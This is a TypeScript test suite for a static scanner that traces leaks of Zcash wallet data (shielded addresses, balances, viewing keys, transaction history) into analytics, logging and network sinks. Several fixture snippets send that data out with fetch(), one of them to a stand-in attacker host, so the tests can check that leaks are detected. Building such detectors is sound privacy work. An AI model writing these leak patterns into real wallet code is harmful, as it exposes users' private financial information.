import assert from 'node:assert/strict'
import { test } from 'node:test'
import { scanSources } from '../packages/core/src/index.js'
import type { ScanOptions } from '../packages/core/src/index.js'

const prelude = `import { getNoirWallet } from '@noir-wallet/sdk';
const wallet = getNoirWallet();
const connection = await wallet.zcash.getAccounts();
`
const scan = (code: string, options?: ScanOptions) => scanSources([{ path: 'app.ts', content: prelude + code }], options)

test('traces a shielded address through a helper into analytics across modules', () => {
  const report = scanSources([
    { path: 'checkout.ts', content: `${prelude}import { record } from './analytics.js'; record(connection.shielded);` },
    { path: 'analytics.ts', content: `import posthog from 'posthog-js'; export function record(address: string) { const payload = { address }; posthog.capture('checkout', payload); }` },
  ])
  assert.equal(report.findings.length, 1)
  const finding = report.findings[0]!
  assert.equal(finding.ruleId, 'ZT003')
  assert.equal(finding.source.file, 'checkout.ts')
  assert.equal(finding.sink.file, 'analytics.ts')
  assert.ok(finding.trace.some(step => step.kind === 'call'))
  assert.ok(finding.trace.some(step => step.label.includes('payload')))
  assert.equal(report.diagnostics.length, 0)
})

test('supports named SDK import aliases and namespace imports', () => {
  for (const code of [
    `import { getNoirWallet as detect } from '@noir-wallet/sdk'; console.log((await detect().zcash.getBalance()).available);`,
    `import * as noir from '@noir-wallet/sdk'; console.log((await noir.getNoirWallet().zcash.getAccounts()).shielded);`,
  ]) assert.equal(scanSources([{ path: 'app.ts', content: code }]).findings.length, 1)
})

test('tracks balance disclosure through destructuring, templates, and JSON', () => {
  const report = scan(`const { available } = await wallet.zcash.getBalance();
const body = JSON.stringify({ info: \`balance: \${available}\` });
fetch('https://collector.example/events', { method: 'POST', body });`)
  assert.equal(report.findings.length, 1)
  assert.equal(report.findings[0]!.kind, 'wallet-balance')
  assert.equal(report.findings[0]!.ruleId, 'ZT002')
})

test('does not treat public fields of an object as sensitive', () => {
  const report = scan(`const payload = { event: 'checkout_started', address: connection.shielded }; console.log(payload.event);`)
  assert.deepEqual(report.findings, [])
})

test('fixing the analytics payload removes the finding', () => {
  const bad = scan(`import posthog from 'posthog-js'; posthog.capture('checkout', { address: connection.shielded });`)
  const fixed = scan(`import posthog from 'posthog-js'; posthog.capture('checkout', { completed: true });`)
  assert.equal(bad.findings.length, 1)
  assert.equal(fixed.findings.length, 0)
})

test('supports named Sentry imports and namespace analytics imports', () => {
  assert.equal(scan(`import { setUser } from '@sentry/react'; setUser({ id: connection.shielded });`).findings[0]!.ruleId, 'ZT003')
  assert.equal(scan(`import * as sentry from '@sentry/browser'; sentry.setContext('wallet', { address: connection.shielded });`).findings[0]!.ruleId, 'ZT003')
})

test('tracks globalThis sinks and aliases of a global sink', () => {
  assert.equal(scan(`globalThis.console.log(connection.shielded);`).findings.length, 1)
  assert.equal(scan(`const send = globalThis.fetch; send('https://example.test', { body: connection.shielded });`).findings.length, 1)
})

test('recognizes a configured viewing-key source, without guessing from names', () => {
  const code = `import { read } from 'my-wallet'; console.log(read());`
  const files = [{ path: 'app.ts', content: code }]
  assert.equal(scanSources(files).findings.length, 0)
  const configured = scanSources(files, { sources: [{ module: 'my-wallet', export: 'read', kind: 'viewing-key' }] })
  assert.equal(configured.findings[0]!.kind, 'viewing-key')
  assert.equal(configured.findings[0]!.severity, 'error')
})

test('does not identify unrelated getBalance or getNoirWallet methods as sources', () => {
  const code = `function getNoirWallet() { return { zcash: { getBalance() { return { available: 12 }; } } }; } console.log(getNoirWallet().zcash.getBalance().available);`
  assert.equal(scanSources([{ path: 'other.ts', content: code }]).findings.length, 0)
})

test('does not identify a shadowed console function as a logging sink', () => {
  assert.equal(scan(`const console = { log(value: string) { return value; } }; console.log(connection.shielded);`).findings.length, 0)
})

test('follows returned values, array destructuring, and callbacks', () => {
  const report = scan(`function address(c: any) { return c.shielded; }
const [selected] = [address(connection)];
[selected].forEach(value => console.log(value));`)
  assert.equal(report.findings.length, 1)
  assert.ok(report.findings[0]!.trace.some(step => step.kind === 'return'))
})

test('retains taint in either branch and clears unconditional reassignment', () => {
  assert.equal(scan(`let value = 'public'; if (flag) { value = connection.shielded; } console.log(value);`).findings.length, 1)
  assert.equal(scan(`let value = connection.shielded; value = 'public'; console.log(value);`).findings.length, 0)
})

test('joins object property changes across branches', () => {
  assert.equal(scan(`const payload = { value: '' }; if (flag) { payload.value = connection.shielded; } else { payload.value = 'public'; } console.log(payload.value);`).findings.length, 1)
})

test('preserves object alias mutation', () => {
  assert.equal(scan(`const payload = { value: '' }; const alias = payload; alias.value = connection.shielded; console.log(payload.value);`).findings.length, 1)
})

test('preserves aliases within branches and after branch joins', () => {
  assert.equal(scan(`const payload = { value: '' }; const alias = payload; if (flag) { alias.value = connection.shielded; } console.log(payload.value);`).findings.length, 1)
  assert.equal(scan(`const payload = { value: '' }; const alias = payload; if (flag) { alias.value = 'one'; } else { alias.value = 'two'; } alias.value = connection.shielded; console.log(payload.value);`).findings.length, 1)
})

test('calls in branches see the current captured values', () => {
  assert.equal(scan(`let value = ''; function log() { console.log(value); } if (flag) { value = connection.shielded; log(); }`).findings.length, 1)
})

test('missing local imports and unsupported callback scheduling require review', () => {
  assert.ok(scan(`import { send } from './missing.js'; send(connection.shielded);`).diagnostics.some(diagnostic => diagnostic.code === 'UNRESOLVED_IMPORT'))
  assert.ok(scan(`setTimeout(() => console.log(connection.shielded), 10);`).diagnostics.some(diagnostic => diagnostic.code === 'UNMODELED_CALL'))
})

test('preserves helper side effects on a passed object', () => {
  assert.equal(scan(`function fill(target: any, value: any) { target.value = value; } const payload = {}; fill(payload, connection.shielded); console.log(payload);`).findings.length, 1)
})

test('spreads preserve sensitive properties and explicit overwrites replace them', () => {
  assert.equal(scan(`const first = { value: connection.shielded }; const second = { ...first }; console.log(second.value);`).findings.length, 1)
  assert.equal(scan(`const first = { value: connection.shielded }; const second = { ...first, value: 'public' }; console.log(second.value);`).findings.length, 0)
})

test('HTTPS origin policies are exact and never authorize logging', () => {
  const options = { allowedNetworkOrigins: ['https://merchant.example'] }
  assert.equal(scan(`fetch('https://merchant.example/pay', { body: connection.shielded });`, options).findings.length, 0)
  assert.equal(scan(`fetch('https://merchant.example.attacker.test/pay', { body: connection.shielded });`, options).findings.length, 1)
  assert.equal(scan(`fetch('http://merchant.example/pay', { body: connection.shielded });`, options).findings.length, 1)
  assert.equal(scan(`console.log(connection.shielded);`, options).findings.length, 1)
})

test('an origin policy never permits sending a viewing key', () => {
  const report = scanSources([{ path: 'app.ts', content: `import { key } from 'wallet'; fetch('https://merchant.example', { body: key() });` }], {
    sources: [{ module: 'wallet', export: 'key', kind: 'viewing-key' }], allowedNetworkOrigins: ['https://merchant.example'],
  })
  assert.equal(report.findings.length, 1)
  assert.equal(report.findings[0]!.severity, 'error')
})

test('dynamic destinations and URL parameters are checked', () => {
  assert.equal(scan(`fetch(destination, { body: connection.shielded });`).findings.length, 1)
  assert.equal(scan(`fetch('https://example.test/?address=' + encodeURIComponent(connection.shielded));`).findings.length, 1)
})

test('sensitive literals and request contents are absent from reports', () => {
  const marker = 'DO_NOT_COPY_THIS_PRIVATE_VALUE'
  const report = scan(`const body = JSON.stringify({ marker: '${marker}', address: connection.shielded }); fetch('https://example.test/${marker}', { body });`)
  assert.equal(report.findings.length, 1)
  assert.ok(!JSON.stringify(report).includes(marker))
})

test('reports transaction history disclosure', () => {
  assert.equal(scan(`const history = await wallet.zcash.getTransactionHistory(); console.table(history);`).findings[0]!.kind, 'wallet-history')
})

test('reports unsupported side effects rather than silently claiming full coverage', () => {
  const report = scan(`unknownLibrary(connection.shielded);`)
  assert.equal(report.summary.coverage, 'incomplete')
  assert.ok(report.diagnostics.some(diagnostic => diagnostic.code === 'UNMODELED_CALL'))
})

test('reports loops, syntax errors, and analysis-budget exhaustion', () => {
  assert.ok(scan(`debugger;`).diagnostics.some(diagnostic => diagnostic.code === 'UNMODELED_STATEMENT'))
  assert.ok(scan('const broken = ;').diagnostics.some(diagnostic => diagnostic.code === 'PARSE_ERROR'))
  assert.ok(scan('console.log(connection.shielded)', { maxSteps: 1 }).diagnostics.some(diagnostic => diagnostic.code === 'ANALYSIS_LIMIT'))
})

test('recursive functions terminate with a review diagnostic', () => {
  const report = scan(`function recurse(value: any) { return recurse(value); } console.log(recurse(connection.shielded));`)
  assert.ok(report.diagnostics.some(diagnostic => diagnostic.code === 'RECURSION'))
  assert.equal(report.findings.length, 1)
})

test('results and identifiers are deterministic across scans', () => {
  const code = `console.log(connection.shielded);`
  assert.deepEqual(scan(code), scan(code))
})
